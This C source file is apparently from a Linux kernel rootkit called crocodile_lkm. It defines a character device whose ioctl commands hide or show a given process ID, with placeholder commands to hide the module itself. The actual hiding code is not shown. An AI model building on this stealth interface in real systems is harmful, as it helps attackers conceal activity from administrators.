/*
 * crocodile_lkm
 * Copyright (C) 2023  Chistyakov Alexander
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <linux/fs.h>
#include <linux/version.h>

#include "types.h"
#include "device/details/cdev_utils.h"
#include "device/details/file_ops.h"
#include "device/details/ioctl_cmd.h"

long dev_ioctl(struct file* p_file, unsigned int cmd, unsigned long arg)
{
    rc_t err = 0;
    rc_t retval = 0;
    pid_t pid;
    module_dev_t* p_dev;

    /*
     * extract the type and number bitfields, and don't decode
     * wrong cmds: return ENOTTY (inappropriate ioctl) before access_ok()
     */
    if (_IOC_TYPE(cmd) != CROC_IOC_MAGIC) {
        return -ENOTTY;
    }
    if (_IOC_NR(cmd) > CROC_IOC_MAX_NR) {
        return -ENOTTY;
    }

    /*
     * the direction is a bitmask, and VERIFY_WRITE catches R/W
     * transfers. `Type' is user-oriented, while
     * access_ok is kernel-oriented, so the concept of "read" and
     * "write" is reversed
     */
    if (_IOC_DIR(cmd) & _IOC_WRITE) {
#if LINUX_VERSION_CODE < KERNEL_VERSION(5,0,0)
        err = ! access_ok(VERIFY_READ, (void __user *)arg, _IOC_SIZE(cmd));
#else
        err = ! access_ok((void __user *)arg, _IOC_SIZE(cmd));
#endif
    }
    if (err != 0) {
        return -EFAULT;
    }

    switch(cmd) {
    case CROC_IOC_RESET:
        /* @todo    Implement */
        break;
    case CROC_IOC_HIDE_PID:
        retval = __get_user(pid, (pid_t __user*)arg);
        if (retval != 0) {
            return retval;
        }
        p_dev = p_file->private_data;
        retval = ioc_hide_pid(p_dev, pid);
        break;
    case CROC_IOC_SHOW_PID:
        retval = __get_user(pid, (pid_t __user*)arg);
        if (retval != 0) {
            return retval;
        }
        p_dev = p_file->private_data;
        retval = ioc_show_pid(p_dev, pid);
        break;
    case CROC_IOC_HIDE_MODULE:
        /* @todo    Implement */
        break;
    case CROC_IOC_SHOW_MODULE:
        /* @todo    Implement */
        break;
    default:
        return -ENOTTY;
    }

    return 0;
}

rc_t dev_open(struct inode* p_inode, struct file* p_file)
{
    module_dev_t* p_dev;   /* device information */

    p_dev = container_of(p_inode->i_cdev, module_dev_t, cdev);
    p_file->private_data = p_dev;   /* for other methods */

    /* now trim to 0 the length of the device if open was write-only */
    if ((p_file->f_flags & O_ACCMODE) == O_WRONLY) {
        if (mutex_lock_interruptible(&p_dev->lock)) {
            return -ERESTARTSYS;
        }
        cdev_trim(p_dev);   /* ignore errors */
        mutex_unlock(&p_dev->lock);
    }
    return 0;               /* success */
}

ssize_t dev_read(struct file* p_file, char __user* p_buf, size_t count, loff_t* p_f_pos)
{
    return 0;
}

rc_t dev_release(struct inode* p_inode, struct file* p_file)
{
    return 0;
}

ssize_t dev_write(struct file* p_file, const char __user* p_buf, size_t count, loff_t* p_f_pos)
{
    return 0;
}

